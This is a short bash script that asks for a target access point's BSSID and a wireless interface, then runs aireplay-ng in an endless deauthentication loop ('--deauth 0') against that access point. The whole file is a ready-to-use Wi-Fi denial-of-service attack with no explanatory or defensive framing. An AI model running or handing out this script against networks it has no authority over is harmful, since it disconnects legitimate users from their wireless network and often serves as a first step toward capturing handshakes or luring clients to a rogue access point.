#!/usr/bin/bash

printf "Whats the target bssid?: "
read bssid
printf "Whats the interface?: "
read interface

sudo aireplay-ng --ignore-negative-one --deauth 0 -a $bssid $interface